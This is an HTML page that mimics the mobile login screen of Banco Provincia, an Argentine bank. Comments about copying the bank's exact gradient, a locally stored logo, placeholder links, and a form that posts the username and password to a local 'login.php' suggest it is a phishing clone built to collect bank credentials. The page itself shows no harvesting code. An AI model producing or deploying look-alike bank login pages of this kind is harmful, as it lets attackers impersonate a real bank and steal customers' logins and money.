<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Banco Provincia</title>
<!-- Iconos para el ojo -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
  :root {
    --verde-banco: #007a2b;
    --turquesa-banco: #2ebcb5;
    --texto-gris: #333333;
    --placeholder-color: #999999;
    --boton-color: #3c3c3c;
    --boton-hover: #555555;
    --radio-boton: 8px;
  }

  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }

  body {
    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    background-color: #f0f2f5; /* Fondo general suave */
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
  }

  .mobile-wrapper {
    width: 100%;
    max-width: 420px; /* Ancho máximo similar a un móvil */
    background-color: #ffffff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    position: relative;
    box-shadow: 0 0 20px rgba(0,0,0,0.1);
  }

  @media (min-width: 421px) {
    .mobile-wrapper {
      height: 95vh;
      border-radius: 12px;
      overflow: hidden;
      margin-top: 20px;
      margin-bottom: 20px;
    }
  }

  /* HEADER CON DEGRADADO EXACTO */
  header {
    background: linear-gradient(135deg, var(--verde-banco) 0%, var(--turquesa-banco) 100%);
    padding: 20px 20px 15px 20px;
    text-align: center;
    color: white;
  }

  .header-content {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 15px;
  }

  /* LOGO PNG */
  .logo-img {
    height: 45px; /* Altura ajustada para que se vea bien */
    width: auto;
  }

  h1 {
    font-size: 1.3rem;
    font-weight: 600;
    letter-spacing: 0.5px;
  }

  .subtitulo {
    font-size: 1.1rem;
    font-weight: 600;
    margin-top: 15px;
    opacity: 0.95;
  }

  /* FORMULARIO */
  form {
    padding: 30px 25px;
    flex-grow: 1;
    display: flex;
    flex-direction: column;
  }

  .input-group {
    margin-bottom: 25px;
    position: relative;
  }

  label {
    display: block;
    margin-bottom: 8px;
    font-weight: 600;
    font-size: 0.95rem;
    color: var(--texto-gris);
  }

  input[type="text"],
  input[type="password"] {
    width: 100%;
    padding: 12px 10px;
    font-size: 1rem;
    border: none;
    border-bottom: 2px solid #dddddd;
    background: transparent;
    color: var(--texto-gris);
    outline: none;
    transition: border-color 0.3s;
  }

  input:focus {
    border-bottom-color: var(--verde-banco);
  }

  input::placeholder {
    color: var(--placeholder-color);
  }

  /* BOTÓN DEL OJO */
  .toggle-pass-btn {
    position: absolute;
    right: 10px;
    top: 38px; /* Ajuste vertical basado en label + padding */
    background: none;
    border: none;
    color: var(--verde-banco);
    cursor: pointer;
    font-size: 1.2rem;
    padding: 5px;
  }

  /* BOTÓN INGRESAR */
  .btn-ingresar {
    width: 100%;
    padding: 14px;
    background-color: var(--boton-color);
    color: white;
    border: none;
    border-radius: var(--radio-boton);
    font-size: 1rem;
    font-weight: 600;
    cursor: pointer;
    margin-top: 10px;
    transition: background-color 0.2s;
  }

  .btn-ingresar:hover {
    background-color: var(--boton-hover);
  }

  /* LINKS INFERIORES */
  .links-container {
    padding: 20px 25px;
    display: flex;
    flex-direction: column;
    gap: 15px;
    border-top: 1px solid #eeeeee;
    background-color: #fafafa;
  }

  .link-item {
    text-decoration: underline;
    color: var(--verde-banco);
    font-size: 0.9rem;
    text-align: left;
    line-height: 1.4;
  }

  .link-item:hover {
    color: #005a20;
  }
  
  .required {
    color: red;
  }
</style>
</head>
<body>

<div class="mobile-wrapper">
  <header>
    <div class="header-content">
      <!-- IMAGEN LOGO GUARDADA COMO logo.png -->
      <img src="logo.png" alt="Logo Banco" class="logo-img">
      <h1>Banco Provincia</h1>
    </div>
    <div class="subtitulo">Iniciá sesión</div>
  </header>

  <form action="login.php" method="POST">
    
    <div class="input-group">
      <label for="usuario">Tu usuario <span class="required">*</span></label>
      <input type="text" id="usuario" name="username" placeholder="Ingresá tu nombre de usuario" required>
    </div>

    <div class="input-group">
      <label for="clave">Tu clave <span class="required">*</span></label>
      <input type="password" id="clave" name="password" placeholder="Ingresá tu clave" required>
      <button type="button" class="toggle-pass-btn" onclick="togglePassword()">
        <i class="fa-regular fa-eye"></i>
      </button>
    </div>

    <button type="submit" class="btn-ingresar">ingresar</button>
  </form>

  <div class="links-container">
    <a href="#" class="link-item">¿No sos BIP? Registrate</a>
    <a href="#" class="link-item">Bloqueé u olvidé mi usuario y/o clave</a>
    <a href="#" class="link-item">Conocé como hacerte usuario u operar</a>
    <a href="#" class="link-item">Recomendaciones de seguridad</a>
  </div>
</div>

<script>
  function togglePassword() {
    const passwordInput = document.getElementById('clave');
    const icon = document.querySelector('.toggle-pass-btn i');
    
    if (passwordInput.type === 'password') {
      passwordInput.type = 'text';
      icon.classList.remove('fa-eye');
      icon.classList.add('fa-eye-slash');
    } else {
      passwordInput.type = 'password';
      icon.classList.remove('fa-eye-slash');
      icon.classList.add('fa-eye');
    }
  }
</script>

</body>
</html>
